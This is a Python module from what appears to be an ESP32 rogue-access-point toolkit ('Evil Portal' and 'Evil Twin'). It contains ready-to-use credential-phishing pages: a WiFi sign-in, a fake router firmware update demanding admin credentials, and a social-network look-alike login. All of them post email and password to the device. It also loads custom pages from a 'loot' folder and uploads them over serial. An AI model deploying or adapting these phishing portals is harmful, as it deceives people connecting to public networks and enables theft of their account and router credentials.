"""Portal management — built-in templates, custom loader, ESP32 upload.

Shared by Evil Portal (standalone AP) and Evil Twin (spoof existing network).
Custom portals live in ``loot/portals/`` which is git-ignored, so user HTML
files survive ``git pull`` updates.
"""

import base64
import logging
from pathlib import Path
from typing import Callable, Optional

log = logging.getLogger(__name__)

# Base64 chunk size for serial transfer.
# 128 chars to stay safe with USB-JTAG (XIAO) which buffers
# differently than CP210x (WROOM). Must fit in firmware cmdline (1024).
_B64_CHUNK = 128

# ---------------------------------------------------------------------------
# Built-in portal HTML templates (compact, <1KB each)
# ---------------------------------------------------------------------------

WIFI_LOGIN_HTML = """\
<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,sans-serif;background:#0a0a23;color:#e0e0e0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.c{background:#1a1a3e;border-radius:12px;padding:32px;width:90%;max-width:360px;box-shadow:0 8px 32px rgba(0,0,0,.4)}
h1{text-align:center;font-size:1.3em;margin-bottom:6px;color:#fff}
.s{text-align:center;font-size:.85em;color:#888;margin-bottom:20px}
label{display:block;font-size:.85em;color:#aaa;margin-bottom:4px}
input{width:100%;padding:10px;border:1px solid #333;border-radius:6px;background:#12122a;color:#fff;font-size:1em;margin-bottom:14px}
button{width:100%;padding:12px;border:none;border-radius:6px;background:#4a6cf7;color:#fff;font-size:1em;font-weight:600;cursor:pointer}
</style></head><body>
<div class="c"><h1>WiFi Access</h1><p class="s">Sign in to connect</p>
<form method="POST" action="/login">
<label>Email</label><input name="email" type="email" required>
<label>Password</label><input name="password" type="password" required>
<button type="submit">Connect</button></form></div></body></html>"""

ROUTER_UPDATE_HTML = """\
<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Router Update</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,sans-serif;background:#1a1a1a;color:#e0e0e0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.c{background:#2a2a2a;border-radius:12px;padding:32px;width:90%;max-width:380px;box-shadow:0 8px 32px rgba(0,0,0,.4)}
h1{text-align:center;font-size:1.2em;margin-bottom:6px;color:#ff9800}
.s{text-align:center;font-size:.85em;color:#aaa;margin-bottom:20px}
.w{background:#3a2a00;border:1px solid #ff9800;border-radius:6px;padding:10px;margin-bottom:16px;font-size:.85em;color:#ffcc80}
label{display:block;font-size:.85em;color:#aaa;margin-bottom:4px}
input{width:100%;padding:10px;border:1px solid #444;border-radius:6px;background:#1a1a1a;color:#fff;font-size:1em;margin-bottom:14px}
button{width:100%;padding:12px;border:none;border-radius:6px;background:#ff9800;color:#000;font-size:1em;font-weight:600;cursor:pointer}
</style></head><body>
<div class="c"><h1>Firmware Update Required</h1><p class="s">Router v4.2.1 security patch</p>
<div class="w">A critical update is available. Enter your credentials to install.</div>
<form method="POST" action="/login">
<label>Admin Username</label><input name="email" required placeholder="admin">
<label>Admin Password</label><input name="password" type="password" required>
<button type="submit">Install Update</button></form></div></body></html>"""

SOCIAL_LOGIN_HTML = """\
<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign In</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.c{background:#fff;border-radius:8px;padding:28px;width:90%;max-width:340px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
h1{text-align:center;font-size:1.3em;color:#1877f2;margin-bottom:16px}
input{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:1em;margin-bottom:12px;color:#333}
button{width:100%;padding:12px;border:none;border-radius:6px;background:#1877f2;color:#fff;font-size:1em;font-weight:600;cursor:pointer}
.d{text-align:center;margin-top:12px;font-size:.85em;color:#888}
</style></head><body>
<div class="c"><h1>Sign In to Continue</h1>
<form method="POST" action="/login">
<input name="email" type="email" placeholder="Email or phone" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<p class="d">Free WiFi access requires sign-in</p></div></body></html>"""

# Combined list: (display_name, html_content_or_None)
# None = use ESP32 firmware built-in portal
BUILTIN_PORTALS: list[tuple[str, Optional[str]]] = [
    ("Default (firmware)", None),
    ("WiFi Login",         WIFI_LOGIN_HTML),
    ("Router Update",      ROUTER_UPDATE_HTML),
    ("Social Login",       SOCIAL_LOGIN_HTML),
]


def get_custom_portals(loot_dir: Path) -> list[tuple[str, str]]:
    """Scan ``loot/portals/*.html`` for user-supplied portal pages.

    Creates the directory if it doesn't exist.
    Returns list of (filename, html_content).
    """
    portal_dir = loot_dir / "portals"
    portal_dir.mkdir(parents=True, exist_ok=True)
    results: list[tuple[str, str]] = []
    for f in sorted(portal_dir.glob("*.html")):
        try:
            html = f.read_text(encoding="utf-8", errors="replace")
            if html.strip():
                results.append((f.name, html))
        except OSError as exc:
            log.warning("Cannot read portal %s: %s", f, exc)
    return results


def get_all_portals(loot_dir: Path) -> list[tuple[str, Optional[str]]]:
    """Return built-in + custom portals. ``None`` html = firmware default."""
    result: list[tuple[str, Optional[str]]] = list(BUILTIN_PORTALS)
    for name, html in get_custom_portals(loot_dir):
        result.append((f"[C] {name}", html))
    return result


def upload_html_to_esp32(html: str, send_fn: Callable[[str], None]) -> None:
    """Base64-encode *html* and send to ESP32 in chunks via serial.

    Protocol (matches JanOS / projectZero firmware):
      set_html_begin
      set_html <b64_chunk>   (repeat, 128-char chunks)
      set_html_end

    Extra sleep between chunks is needed for XIAO USB-JTAG which
    buffers serial differently than WROOM CP210x.
    """
    import time as _time

    send_fn("set_html_begin")
    _time.sleep(0.1)
    b64 = base64.b64encode(html.encode("utf-8")).decode("ascii")
    for i in range(0, len(b64), _B64_CHUNK):
        chunk = b64[i:i + _B64_CHUNK]
        send_fn(f"set_html {chunk}")
        _time.sleep(0.1)
    _time.sleep(0.1)
    send_fn("set_html_end")
    _time.sleep(0.3)
    log.info("Uploaded portal HTML (%d bytes, %d chunks)",
             len(html), (len(b64) + _B64_CHUNK - 1) // _B64_CHUNK)
